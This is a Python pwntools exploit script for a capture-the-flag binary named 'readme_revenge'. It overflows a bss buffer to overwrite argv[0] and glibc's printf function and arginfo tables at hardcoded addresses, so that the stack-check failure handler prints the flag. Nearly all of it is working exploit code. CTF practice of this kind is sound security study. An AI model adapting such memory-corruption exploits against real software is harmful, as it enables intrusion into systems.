# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './readme_revenge'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>',num)

def attack():
    
    flag_addr = 0x00000000006B4040
    name_addr = 0x00000000006B73E0
    argv_addr = 0x00000000006b7980

    __printf_function_table_addr = 0x00000000006B7A28
    __printf_arginfo_table_addr = 0x00000000006B7AA8
    # 由于是静态连接，这两个地址可以自己去 printf 函数中去找
    
    stack_chk_fail = 0x00000000004359b0
    
    payload  = p64(flag_addr)
    payload  = payload.ljust(0x73*8 , '\x00')
    payload += p64(stack_chk_fail) #设置要执行的函数
    payload  = payload.ljust(argv_addr - name_addr , '\x00')
    payload += p64( name_addr ) #设置 argv[0] 即程序名地址为 flag 的地址、
    payload  = payload.ljust(__printf_function_table_addr - name_addr , '\x00')
    payload += p64(1)
    payload  = payload.ljust(__printf_arginfo_table_addr - name_addr , '\x00')
    payload += p64( name_addr ) #设置要执行的函数地址 （需要算好偏移）

    # 本题输入在bss段，可以将下面的东西全部覆盖到
    sl(payload)

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   readme_revenge.py
@Time    :   2022/01/26 18:11:40
@Author  :   Niyah 
'''